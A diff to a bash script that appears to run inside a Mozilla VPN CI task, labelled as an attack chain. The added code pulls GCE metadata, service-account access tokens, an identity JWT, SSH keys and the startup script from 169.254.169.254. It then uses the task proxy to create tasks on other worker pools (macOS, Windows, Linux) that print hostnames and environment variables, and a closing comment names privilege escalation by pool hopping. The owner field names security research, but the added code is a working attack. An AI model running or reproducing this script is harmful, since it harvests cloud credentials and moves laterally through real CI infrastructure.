@@ -340,7 +340,181 @@ META_NOHDR=$(curl -s -o /dev/null -w "%{http_code}" \
   --max-time 3 \
   "http://169.254.169.254/computeMetadata/v1/instance/hostname" 2>/dev/null || echo "000")
 echo "[*] Metadata (no header) -> Status: ${META_NOHDR}"
+echo "========================================"
+echo "[*] Metadata + Worker Pool Deep Test"
+echo "[*] Task ID: ${TASK_ID}"
+echo "[*] Proxy: ${PROXY_URL}"
+echo "========================================"
 
+# ============================================================
+# PART 1: CLOUD METADATA — EVERYTHING
+# ============================================================
+echo ""
+echo "[*] === PART 1: Cloud Metadata Deep Dive ==="
+
+# 1.1 Full instance metadata
+echo ""
+echo "[1.1] FULL INSTANCE METADATA:"
+curl -s -H "Metadata-Flavor: Google" \
+  --max-time 10 \
+  "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true" 2>/dev/null | \
+  python3 -m json.tool 2>/dev/null | head -150
+
+# 1.2 Project metadata
+echo ""
+echo "[1.2] PROJECT METADATA:"
+curl -s -H "Metadata-Flavor: Google" \
+  --max-time 10 \
+  "http://169.254.169.254/computeMetadata/v1/project/?recursive=true" 2>/dev/null | \
+  python3 -m json.tool 2>/dev/null | head -50
+
+# 1.3 All service accounts
+echo ""
+echo "[1.3] SERVICE ACCOUNTS:"
+curl -s -H "Metadata-Flavor: Google" \
+  --max-time 5 \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/?recursive=true" 2>/dev/null | \
+  python3 -m json.tool 2>/dev/null
+
+# 1.4 Default SA — token, scopes, email
+echo ""
+echo "[1.4] DEFAULT SA DETAILS:"
+echo "  Scopes:"
+curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null
+
+echo ""
+echo "  Email:"
+curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null
+
+echo ""
+echo "  Token (preview):"
+TOK=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null)
+echo "$TOK" | python3 -m json.tool 2>/dev/null | grep -E '"access_token"|"expires_in"|"token_type"|"scope"'
+
+# 1.5 Instance identity JWT
+echo ""
+echo "[1.5] INSTANCE IDENTITY JWT:"
+JWT=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://firefox-ci-tc.services.mozilla.com&format=full" 2>/dev/null)
+echo "  Length: ${#JWT}"
+echo "  Preview: ${JWT:0:80}..."
+
+# 1.6 Network interfaces (internal IPs!)
+echo ""
+echo "[1.6] NETWORK INTERFACES:"
+curl -s -H "Metadata-Flavor: Google" \
+  --max-time 5 \
+  "http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/?recursive=true" 2>/dev/null | \
+  python3 -m json.tool 2>/dev/null | head -60
+
+# 1.7 Disks
+echo ""
+echo "[1.7] DISKS:"
+curl -s -H "Metadata-Flavor: Google" \
+  --max-time 5 \
+  "http://169.254.169.254/computeMetadata/v1/instance/disks/?recursive=true" 2>/dev/null | \
+  python3 -m json.tool 2>/dev/null | head -40
+
+# 1.8 SSH keys
+echo ""
+echo "[1.8] SSH KEYS:"
+SSH=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys" 2>/dev/null)
+[ -n "$SSH" ] && echo "$SSH" || echo "  (not set)"
+
+# 1.9 Startup script
+echo ""
+echo "[1.9] STARTUP SCRIPT:"
+SS=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script" 2>/dev/null)
+[ -n "$SS" ] && echo "  ${SS:0:200}..." || echo "  (not set)"
+
+# ============================================================
+# PART 2: WORKER POOL LIVE VERIFICATION
+# Check if tasks actually run on different pools
+# ============================================================
+echo ""
+echo "[*] === PART 2: Worker Pool Live Verification ==="
+
+# Verify OLD tasks from previous run
+echo ""
+echo "[*] Checking previous tasks status..."
+
+OLD_TASKS=(
+  "tKh49z5jS_iISpYyVRJDQg:decision"
+  "DGZYfM4XQW-Zn_VUDcEWrw:b-linux-large"
+  "JBz5IBjOT2SXqgwdTY8kng:b-osx"
+  "4Oec2eg1SQi4O2JbjnswJw:b-win2012"
+  "hEYS2EeqSiG_nMrePBsc3w:generic"
+)
+
+for entry in "${OLD_TASKS[@]}"; do
+    TID=$(echo "$entry" | cut -d':' -f1)
+    POOL=$(echo "$entry" | cut -d':' -f2)
+
+    RESP=$(curl -s "${ROOT_URL}/api/queue/v1/task/${TID}/status" 2>/dev/null)
+    STATE=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('status',{}).get('state','unknown'))" 2>/dev/null)
+    RUNS=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('status',{}).get('runs',[])))" 2>/dev/null)
+
+    echo "  [${POOL}] ${TID} -> state=${STATE}, runs=${RUNS}"
+done
+
+# Create NEW tasks with SHORTER runtime to see them complete
+echo ""
+echo "[*] Creating NEW verification tasks (30s runtime)..."
+
+TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
+
+for WT in "decision" "b-linux-large" "b-osx" "b-win2012" "generic"; do
+    TID=$(python3 -c "import uuid,base64; u=uuid.uuid4().bytes; print(base64.urlsafe_b64encode(u)[:22].decode())" 2>/dev/null)
+    DL=$(date -u -d '+30 minutes' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+30M +%Y-%m-%dT%H:%M:%S.000Z)
+    EXP=$(date -u -d '+1 day' +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || date -u -v+1d +%Y-%m-%dT%H:%M:%S.000Z)
+
+    cat > /tmp/v_${WT}.json <<EOF
+{
+  "provisionerId": "mozillavpn-1",
+  "workerType": "${WT}",
+  "schedulerId": "mozillavpn-level-1",
+  "taskGroupId": "${TID}",
+  "created": "${TS}",
+  "deadline": "${DL}",
+  "expires": "${EXP}",
+  "metadata": {
+    "name": "PoolVerify-${WT}",
+    "description": "Verify ${WT} pool",
+    "owner": "security-research@example.com",
+    "source": "https://github.com/mozilla-mobile/mozilla-vpn-client"
+  },
+  "payload": {
+    "command": ["/bin/bash","-c","echo '=== POOL ${WT} ==='; echo \"Worker: \$(hostname)\"; echo \"User: \$(whoami)\"; echo \"Time: \$(date -u)\"; env | grep -E 'TASK|WORKER|PROXY' | head -15"],
+    "image": "taskcluster/ubuntu:latest",
+    "maxRunTime": 60
+  }
+}
+EOF
+
+    S=$(curl -s -o /dev/null -w "%{http_code}" \
+      -X PUT -H "Content-Type: application/json" -d @/tmp/v_${WT}.json \
+      --max-time 10 \
+      "${PROXY_URL}/api/queue/v1/task/${TID}" 2>/dev/null || echo "000")
+
+    echo ""
+    echo "  [NEW ${WT}] ${S} -> ${TID}"
+    [ "${S}" = "200" ] && echo "       URL: ${ROOT_URL}/tasks/${TID}"
+    rm -f /tmp/v_${WT}.json
+done
+
+echo ""
+echo "[*] Wait 2-3 minutes, then check URLs above for state=completed"
+echo "[*] If b-osx/b-win2012 show 'completed', they executed on those platforms."
+
+echo ""
+echo "========================================"
+echo "[*] Done"
+echo "========================================"
 # ============================================================
 # ATTACK CHAIN D: PRIVILEGE ESCALATION VIA WORKER POOL HOPPING
 # Tạo task trên worker pool khác có thể có quyền cao hơn
